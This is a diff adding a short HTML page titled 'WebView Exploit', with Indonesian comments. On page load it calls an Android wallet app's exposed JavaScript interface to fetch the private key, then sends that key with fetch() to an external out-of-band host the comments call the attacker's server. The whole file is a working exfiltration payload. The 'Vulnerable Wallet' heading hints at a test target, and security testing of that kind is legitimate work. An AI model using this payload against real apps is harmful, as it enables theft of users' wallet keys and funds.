@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WebView Exploit</title>
+    <script>
+        // Payload untuk JavaScript Interface Injection
+        function exploit() {
+            // Misalnya, aplikasi menyediakan fungsi "androidInterface.getPrivateKey"
+            if (window.androidInterface) {
+                const privateKey = window.androidInterface.getPrivateKey();
+                // Kirim private key ke server attacker
+                fetch("http://wwkmjidjzqjqbtxtimcqcxi6yhsi4icbr.oast.fun/steal?key=" + privateKey);
+            }
+        }
+        window.onload = exploit;
+    </script>
+</head>
+<body>
+    <h1>Welcome to Vulnerable Wallet</h1>
+</body>
+</html>
